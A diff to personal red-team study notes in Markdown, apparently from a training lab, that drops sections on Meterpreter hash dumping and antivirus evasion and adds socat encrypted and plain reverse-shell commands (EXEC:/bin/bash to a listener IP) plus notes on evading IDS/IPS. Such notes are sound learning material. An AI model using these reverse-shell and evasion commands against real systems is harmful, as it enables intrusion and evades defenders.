@@ -1,7 +1,6 @@
 - [Basic Steps](#basic-steps)
   - [active](#active)
   - [External Tools](#external-tools)
-  - [Meterpreter (payload)](#meterpreter-payload)
   - [Phishing](#phishing)
 - [Passive](#passive)
   - [recon-ng](#recon-ng)
@@ -17,10 +16,9 @@
   - [Empire (windows) / Starkiller](#empire-windows--starkiller)
   - [Hop Listener](#hop-listener)
 - [Git Enumeration](#git-enumeration)
-- [Antivirus Evasion](#antivirus-evasion)
-  - [Cross compilation](#cross-compilation)
-  - [How AV Works](#how-av-works)
 - [Wireshark](#wireshark)
+- [Network Security Evasion](#network-security-evasion)
+- [IDS x IPS](#ids-x-ips)
 
 # Basic Steps
 - Enumerate
@@ -42,7 +40,6 @@
 - https://www.rapid7.com/db/
 - searchsploit
 
-
 ## External Tools
 - enum4linux IP_
 - metasploit (smb/enum || ssh/enum)
@@ -55,13 +52,6 @@
 
 - PowerSploit (windows)
   - in the target 
-
-## Meterpreter (payload)
-- hashdump (migrate to process first)
-- getpid
-- getpriv
-- migrate PID [try and error, migrating to existing process] + check hashdump
-- search
 
 ## Phishing
 - Steps
@@ -187,12 +177,43 @@
 - Port Forwarding [From_Compromised_to_TARGET]: ./socat tcp-l:[port_on_compromised],fork,reuseaddr tcp:[IP_Target]:3306 &
 
 - Encrypted:
+  - Create key + Litener + Connect
   - Create certificate: openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
   - merge keys: cat shell.key shell.crt > shell.pem
   - listener: socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
   - connect back: socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
  close all:
   - jobs ==> find socats processes 
+
+- Steps:
+```
+# Create key
+
+openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt
+
+# req = certificate
+# -x509 = type of certificate
+# -newkey rsa:4096 = type of key with size
+# -days = valid
+# -subj = organization, country
+# -nodes = NOT encrypt private key
+# -keyout PRIVATE = file with the private key
+# -out Certificate = file to write certificate
+
+
+# PEM = privace enhanced mail = concat .key + .cert
+cat thm-reverse.key thm-reverse.crt > thm-reverse.pem.
+
+# Start listener
+socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT
+
+# Connect
+socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash
+
+# Without encryption
+  # Listener # socat -d -d TCP-LISTEN:4443,fork STDOUT
+  # Victim   # socat TCP:10.20.30.129:4443 EXEC:/bin/bash
+```
   
 ## CHISEL
 - set up tunnel proxy / port forward
@@ -317,37 +338,6 @@
   - Read files: 
     - separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"
 
-# Antivirus Evasion
-- Fundamentals
-- 2 types
-  - on-disk
-    - execute on target
-  - in memory
-    - import into memory and execute. Not save in the disk
-  
-- Identify AV
-  - Seatbelt
-  - SharpEDRChecker
-  - disable cloud-based protection: test our payload
-  
-- Obfuscate payload
-  - encode string
-  - split parts
-  - https://www.gaijin.at/en/tools/php-obfuscator
-
-## Cross compilation
-- run programs in different platforms
-
-## How AV Works
-- Static
-  - signature detection
-  - byte matching: find matching sequences in the file
-- Dynamic / Heuristic / Behavioural
-  - line by line execution
-  - pre-defined rules
-  - no gan, no gui + VM = sandbox
-
-
 # Wireshark
 - statistical of
   - protocol
@@ -363,3 +353,22 @@
 - Check queries
   - dns
   - http
+
+# Network Security Evasion
+
+# IDS x IPS
+- Intrusion Detecting System
+- Intrusion Prevention System ==> inline
+- host-base AND network-based
+- Evade
+  - protocol manipulation
+  - payload manipulation
+  - route manipulation
+  - tactical denial of service
+
+- Obfuscation
+  - base64 
+  - urlencode
+  - [Cyberchef](https://icyberchef.com/)
+- Encrypt
+  - 
